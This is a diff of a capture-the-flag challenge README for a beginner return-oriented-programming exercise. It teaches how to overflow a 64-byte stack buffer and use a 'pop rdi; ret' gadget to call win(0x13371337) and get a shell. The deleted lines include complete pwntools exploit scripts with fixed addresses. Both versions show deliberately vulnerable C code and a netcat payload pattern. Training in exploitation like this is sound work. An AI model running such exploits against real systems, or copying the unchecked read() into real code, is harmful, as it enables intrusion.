@@ -1,15 +1,53 @@
-# Challenge 03: R0P_Me - ROP with Arguments
+# Challenge 03: R0P_Me — Return-Oriented Programming Basics
 
-**Difficulty**: ★★★☆☆ Medium  
-**Binary**: `r0p_me`  
-**Port**: 1339  
-**Category**: Return-Oriented Programming (ROP) / Calling Convention
+**Difficulty:** ★★☆☆☆ Medium  
+**Binary:** `r0p_me`  
+**Port:** 1340  
+**Category:** Pwn / Stack Buffer Overflow / Return-Oriented Programming
 
 ## Description
 
-The `win()` function now requires an argument: `magic == 0x13371337`. You must use ROP to load this value into `RDI` (1st argument register) before calling `win()`.
+R0P_Me introduces the next step in stack-based binary exploitation: controlling not only the program's execution flow, but also the arguments passed to a function.
 
-## Source Code Analysis
+The binary contains a vulnerable function that reads more data into a stack buffer than it can hold. By exploiting this vulnerability, players can overwrite the saved return address and redirect execution to an existing function.
+
+However, there is a catch: the target function expects a specific argument. Reaching it without satisfying that requirement will not be enough.
+
+The challenge introduces the fundamentals of **ret2win exploitation with register control**, a stepping stone toward Return-Oriented Programming (ROP).
+
+## Intended Learning Objectives
+
+Players should learn how to:
+
+- Identify a stack buffer overflow in a compiled binary.
+- Inspect a binary using `file`, `objdump`, `readelf`, and `gdb`.
+- Locate useful functions and gadgets.
+- Determine the offset to the saved return address.
+- Understand the x86-64 System V calling convention.
+- Understand how function arguments are passed through registers.
+- Construct a payload that controls execution and prepares the required argument.
+- Understand how a `pop rdi; ret` gadget can be used in a ROP chain.
+- Interact with a shell spawned by a remotely exploited process.
+
+## Vulnerability
+
+The vulnerable function effectively performs the following operation:
+
+```c
+void vulnerable(void)
+{
+    char buffer[64];
+    read(0, buffer, 256);
+}
+```
+
+The destination buffer is only **64 bytes**, while `read()` allows up to **256 bytes** to be written.
+
+Because the input length is not restricted to the buffer's capacity, an attacker can overwrite adjacent stack data, including the saved return address.
+
+## Target Function
+
+The binary contains a function that requires a specific argument:
 
 ```c
 void win(unsigned long magic)
@@ -18,151 +56,121 @@ void win(unsigned long magic)
         return;
 
     puts("Correct!");
-    system("/bin/sh");
-}
-
-void vulnerable(void)
-{
-    char buffer[64];
-    read(0, buffer, 256);
+    system("/bin/bash -i");
 }
 ```
 
-### Vulnerability
+The function checks whether its argument matches `0x13371337`. If the value is incorrect, the function returns without spawning a shell.
 
-Same buffer overflow as Returnal (64-byte buffer, 256-byte read).
-But `win()` requires `RDI = 0x13371337`.
+The function is not called during normal execution, so the player must redirect execution to it through the overflow.
 
-## Binary Protections
+## The Extra Challenge: Function Arguments
 
-```bash
-$ checksec --file=r0p_me
-Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-```
+On Linux x86-64, the System V AMD64 calling convention specifies that the first integer or pointer argument is passed in the `RDI` register.
 
-## x86-64 Calling Convention (System V AMD64 ABI)
+Consequently, overwriting the saved return address to point directly to `win()` is insufficient. The required argument must also be prepared before the function executes.
 
-| Argument | Register |
-|----------|----------|
-| 1st      | RDI      |
-| 2nd      | RSI      |
-| 3rd      | RDX      |
-| 4th      | RCX      |
-| 5th      | R8       |
-| 6th      | R9       |
+The binary includes a useful instruction sequence:
 
-To call `win(0x13371337)`, we need `RDI = 0x13371337` before the call.
-
-## ROP Gadgets
-
-We need a gadget to pop a value from stack into RDI:
-```
+```asm
 pop rdi
 ret
 ```
 
-When this gadget executes:
-1. `pop rdi` - loads value at RSP into RDI, increments RSP by 8
-2. `ret` - pops next value from stack into RIP, jumps there
+This sequence can be used to load a chosen value from the stack into `RDI`, then continue execution using the next return address.
 
-### Finding the Gadget
+A successful payload must therefore account for:
+
+1. The padding needed to reach the saved return address.
+2. The address of a suitable gadget.
+3. The required argument value.
+4. The address of the target function.
+
+The exact addresses and offsets should be determined from the provided binary rather than assumed.
+
+## Intended Exploitation Path
+
+The intended solution follows these steps:
+
+1. Inspect the binary and identify interesting functions.
+2. Locate `win()` and the available instruction sequences.
+3. Determine the offset to the saved return address.
+4. Identify a suitable gadget for controlling the first function argument.
+5. Construct a ROP chain that places `0x13371337` in `RDI`.
+6. Redirect execution to `win()`.
+7. Verify that the program prints `Correct!` and provides an interactive shell.
+
+This challenge builds on a basic ret2win exploit by introducing **argument control through a ROP gadget**.
+
+## Binary Protections
+
+The challenge is intended to be beginner-friendly, with predictable code addresses and no stack canary.
+
+Expected relevant properties include:
+
+- **No stack canary:** stack corruption is not detected by a canary check.
+- **No PIE:** executable code addresses remain predictable.
+- **NX enabled:** code injection is unnecessary because the exploit reuses existing instructions.
+- **A predictable target function:** `win()` can be located through binary analysis.
+
+Verify the actual protections of the distributed binary with:
 
 ```bash
-ROPgadget --binary r0p_me | grep "pop rdi"
-# Example output: 0x00000000004012bb : pop rdi ; ret
-
-# Or with ropper:
-ropper --file r0p_me --search "pop rdi"
+checksec --file=r0p_me
 ```
 
-## Exploitation: ROP Chain
+The deployed binary should match the version used during testing.
 
-### Stack Layout
+## Server
 
-```
-High Addresses
-|------------------------|
-| win() address          |  <-- RIP jumps here after gadget (RDI = 0x13371337)
-|------------------------|
-| 0x13371337 (8 bytes)   |  <-- pop rdi loads this into RDI
-|------------------------|
-| pop rdi; ret address   |  <-- vulnerable() returns here first
-|------------------------|
-| Saved RBP (8 bytes)    |  <-- Padding
-|------------------------|
-| buffer[64] (64 bytes)  |  <-- Padding
-|------------------------|
-Low Addresses
+The challenge is exposed through a TCP service on port `1340`.
+
+Connect using:
+
+```bash
+nc localhost 1340
 ```
 
-### Offset Calculation
+If the exploit successfully spawns an interactive shell, the player's input stream must remain open. For a locally generated payload, a pattern such as the following keeps standard input available:
 
-Buffer (64) + Saved RBP (8) = **72 bytes** to reach RIP.
-
-### Exploit Script
-
-```python
-from pwn import *
-
-p = process('./r0p_me')
-# p = remote('localhost', 1339)
-
-# Addresses (find with GDB/ROPgadget)
-pop_rdi = 0x4012bb    # pop rdi ; ret
-win_addr = 0x401176   # win() address
-magic = 0x13371337
-
-offset = 72
-
-payload = b'A' * offset
-payload += p64(pop_rdi)
-payload += p64(magic)
-payload += p64(win_addr)
-
-p.sendline(payload)
-p.interactive()
+```bash
+(your_payload; cat) | nc localhost 1340
 ```
 
-### Using pwntools ROP Helper
+Replace `your_payload` with the command that generates the actual exploit input.
 
-```python
-from pwn import *
+The trailing `cat` is important because the shell needs to continue receiving input after the initial payload has been sent.
 
-elf = ELF('./r0p_me')
-p = process('./r0p_me')
+## Files
 
-rop = ROP(elf)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-win_addr = elf.symbols['win']
+The player package contains:
 
-payload = b'A' * 72
-payload += p64(pop_rdi)
-payload += p64(0x13371337)
-payload += p64(win_addr)
-
-p.sendline(payload)
-p.interactive()
+```text
+R0P_Me/
+├── challenge.txt
+└── r0p_me
 ```
 
 ## Flag
 
-Successful exploit gives interactive shell. Read flag.txt.
+The flag is provided by the challenge environment after successful exploitation.
 
-## Key Concepts Learned
+Flag format:
 
-- System V AMD64 calling convention
-- ROP gadgets: reusing existing code ending in `ret`
-- Register control via `pop reg; ret`
-- Chaining multiple returns
-- pwntools ROP automation
+```text
+0XATTACK{...}
+```
 
-## Progressive Hints
+## Author Notes
 
-1. On x86-64, where is the 1st function argument passed? (Not on stack!)
-2. What instruction loads a value from stack into a register? `pop <reg>`
-3. Find gadget: `ROPgadget --binary r0p_me | grep "pop rdi"`
-4. Place `0x13371337` immediately after the gadget address on the stack
+R0P_Me is intended to follow **Returnal**, which introduces overwriting a saved return address to reach an existing function.
+
+The progression is deliberate:
+
+- **Oopsie:** Understand the fundamentals of stack buffer overflows.
+- **Returnal:** Redirect execution by overwriting the saved return address.
+- **R0P_Me:** Control a function argument using a ROP gadget before redirecting execution.
+
+The challenge should not require shellcode or advanced ROP techniques. Its central lesson is that controlling the instruction pointer alone does not guarantee a successful exploit: the target function must also receive the arguments it expects.
+
+The `pop rdi; ret` gadget is intentionally included to make register control accessible to beginners while introducing a technique that will be useful in more advanced binary exploitation challenges.
